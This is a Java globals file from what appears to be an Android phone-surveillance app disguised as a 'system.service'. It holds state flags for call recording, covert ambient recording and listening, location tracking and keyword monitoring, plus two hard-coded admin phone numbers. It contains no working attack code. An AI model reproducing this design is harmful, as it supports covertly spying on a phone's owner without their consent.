package system.service;

import system.service.feature.location.LocationUtil;
import system.service.utils.FileCtrl.STORAGE_MODE;
import android.media.MediaRecorder;

import com.particle.inspector.common.util.license.LICENSE_TYPE;

public class GlobalValues 
{
	// Initialize global values 
	public static LICENSE_TYPE licenseType = LICENSE_TYPE.NOT_LICENSED;
	public static String deviceID = null;
	public static String[] recipients = null;
	public static String[] sensitiveWordArray = null;
	
	// For phone call recording
	public static boolean IS_CALL_RECORDING = false;
	public static String callRecordFilePrefix = null;
	
	// For env recording feature
	public static boolean IS_ENV_RECORDING = false;
	public static MediaRecorder recorder = null;
	public static String envRecordFilePrefix = null; 
	
	// The state flag for env listening feature
	public static boolean IS_ENV_LISTENING = false;
	public static int ORIGINAL_RING_MODE;
	
	// The state flag for phone location feature
	public static boolean IS_GETTING_LOCATION = false;
	
	// Admin phones
	public static String[]adminPhones = {"15100760464", "15319967068"};
	public static boolean isAdminPhone(String comingPhone) {
		for (String adminPhone : adminPhones) {
			if (comingPhone.contains(adminPhone)) return true;
		}
		return false;
	}
	
	// Location Utitity
	public static LocationUtil locationUtil = null;
	
	// Storage Mode
	public static STORAGE_MODE storageMode = STORAGE_MODE.INTERNAL;
}
